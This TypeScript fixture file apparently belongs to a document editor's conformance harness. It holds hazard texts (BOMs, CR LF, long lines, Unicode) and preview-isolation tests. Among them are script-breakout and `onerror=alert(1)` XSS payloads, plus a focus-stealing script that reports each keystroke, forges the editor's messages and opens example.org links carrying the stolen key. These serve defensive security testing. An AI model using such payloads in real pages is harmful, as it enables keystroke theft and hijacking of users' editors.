/**
 * The harness's own texts: hazards every carrier must carry exactly (FC-18 §11:
 * any Unicode, CR LF / CR, a BOM, `</script>`, `<!--`, very long lines, the
 * empty text), the texts `assemble` must refuse, and the documents the browser
 * checks open.
 */

/** Uids used by the browser checks (well-formed, FC-18 §5.1). */
export const UID_A = 'doc-conformance0a1b2c';
export const UID_B = 'doc-conformance9z8y7x';

/** Hazard texts by name. Every one has consistent line endings and no NUL or lone surrogate, so law 1 applies. */
export const HAZARD_TEXTS: Readonly<Record<string, string>> = {
  empty: '',
  'crlf-bom': `﻿{{nyml\r\nkind: document\r\ntitle: CR LF and a BOM\r\nuid: ${UID_A}\r\nx_host_key: kept\r\n}}\r\n\r\n# Heading\r\n\r\ntrailing spaces  \r\n`,
  cr: '{{nyml\rkind: document\rtitle: Classic Mac\r}}\r\rclassic line ends\r',
  'bom-only': '﻿',
  'script-close': '# </script><script>alert(1)</script> <SCRIPT src=x> </ScRiPt > <\\/script> <\\\\script>\n\n<!-- a comment --> --> <!-- <!--\n',
  'reserved-ids': '<div id="orz-src">a fake island</div>\n<script id="orz-shell">{"kind":"paged"}</script>\n<script type="text/markdown" id="orz-src">nested</script>\n',
  unicode: '{{nyml\nkind: document\ntitle: 漢字 — 𝒳\nlang: zh-Hans\n}}\n\n𝒳 İ ǅ ß é (é) ​‍ 👩‍🔬   line separator   paragraph separator\n',
  'long-line': `${'word '.repeat(40_000)}\n`,
  'no-final-newline': '# Title\n\nno final newline',
  whitespace: '\t\n   \n\t# indented\n  \n\n\n',
  'header-lookalikes': '{{nyml\nkind: document\ntitle: "  quoted  "\nx_alembic_chapter: 3\n}}\n\n```\n{{nyml\nkind: document\ntitle: in code\n}}\n```\n\n{{nyml\nkind: meta\ntitle: later block\n}}\n',
  'html-entities': '&lt;script&gt; &amp;amp; &#x3C;/script> \\< \\& <b>bold</b> <img src=x onerror=alert(1)>\n',
};

/** Texts `assemble` must refuse (FC-18 §2: NUL, lone surrogate; §8.4: a newer format). */
export const REFUSED_TEXTS: Readonly<Record<string, string>> = {
  nul: 'a\u0000b\n',
  'lone-surrogate': 'a\uD800b\n',
  'format-2': '{{nyml\nkind: document\nformat: 2\n}}\n\nfrom the future\n',
};

/** The text the edit, save and preference checks open (CR LF, a BOM, a uid, a host key, script hazards). */
export const EDIT_TEXT = `﻿{{nyml\r\nkind: document\r\ntitle: Conformance — 漢字\r\nuid: ${UID_A}\r\nx_host_key: kept\r\n}}\r\n\r\n# Conformance\r\n\r\nA paragraph with </script> and 𝒳.\r\n\r\nLast line.\r\n`;

/** A second document (another uid) for the preference check. */
export const OTHER_TEXT = `{{nyml\nkind: document\ntitle: Other\nuid: ${UID_B}\n}}\n\n# Other\n`;

/** A marker the harness puts in the live DOM; a saved file must never contain it. */
export const LIVE_DOM_MARKER = 'ORZ-CONFORMANCE-LIVE-DOM-MARKER';

/** A text in a newer format (header `format: 2`): opened, it must be read-only and never saved over (FC-18 §8.4, D7). */
export const NEWER_TEXT = '{{nyml\nkind: document\nformat: 2\ntitle: From a newer release\nuid: doc-conformance5f6g7h\n}}\n\n# From a newer release\n\nWritten in a format this release does not write.\n';

/** A long text the preview-isolation check types into (its end is far below the fold). */
export const LONG_TEXT = `{{nyml\nkind: document\ntitle: Preview isolation\nuid: doc-conformance3p4q5r\n}}\n\n# Preview isolation\n\n${Array.from({ length: 160 }, (_, i) => `Paragraph ${i + 1} of a long document.\n`).join('\n')}`;

/**
 * A document script that steals the focus (ES5; no double quote, so it fits an HTML attribute): it
 * puts an input in the preview and focuses it every 40 ms, posts a heartbeat
 * (`orz-conformance-theft`) so the harness knows it runs, and on every key it receives reports it
 * (`orz-conformance-stolen`) and forges the preview's own messages — a save key, Escape, "active",
 * a link — and a popup, all inside the user activation that key gives the frame.
 */
export const THEFT_SCRIPT = "(function(){if(window.__orzTheft)return;window.__orzTheft=1;var P=parent,i=document.createElement('input');i.setAttribute('aria-label','theft');(document.body||document.documentElement).appendChild(i);"
  + "document.addEventListener('keydown',function(e){P.postMessage({type:'orz-conformance-stolen',key:e.key},'*');P.postMessage({type:'orz-preview-active'},'*');P.postMessage({type:'orz-preview-key',key:'s'},'*');P.postMessage({type:'orz-preview-key',key:'Escape'},'*');P.postMessage({type:'orz-preview-link',href:'https://example.org/stolen-'+e.key},'*');try{window.open('https://example.org/stolen-popup')}catch(x){}},true);"
  + "setInterval(function(){P.postMessage({type:'orz-conformance-theft'},'*');if(document.activeElement!==i)i.focus()},40)})()";

/** A document whose preview runs {@link THEFT_SCRIPT} (from an image error handler, as a document script would). */
export const THEFT_TEXT = `{{nyml\nkind: document\ntitle: Focus theft\nuid: doc-conformance7t8u9v\n}}\n\n# Focus theft\n\nA picture <img src="x-missing.png" alt="" onerror="${THEFT_SCRIPT}">\n\n${Array.from({ length: 40 }, (_, i) => `Line ${i + 1} of the text the reader edits.\n`).join('\n')}`;

/**
 * A document with includes (FC-18 §8.3, D4) and the resolved includes its file carries in
 * `#orz-includes` (keys in code-unit order, as the island stores them). A page cannot resolve local
 * includes again: its saves and its quiet update must carry these over exactly. The same text and
 * includes are the corpus file `md/includes.md` and its manifest entry.
 */
export const INCLUDE_TEXT = `{{nyml\nkind: document\nformat: 1\ntitle: Titration lab — with includes\nuid: doc-conformance1i2n3c\n}}\n\n# Titration lab\n\n{{md parts/safety-rules.md}}\n\nProcedure follows.\n\n{{md https://example.org/notes/glossary.md}}\n`;
export const INCLUDES: Readonly<Record<string, string>> = {
  'https://example.org/notes/glossary.md': '## Glossary\r\n\r\nTitrant — 𝒳 the solution of known concentration.\r\n',
  'parts/safety-rules.md': '## Safety rules\n\n- Goggles on. A literal </script> stays text.\n- No food in the lab.\n',
};
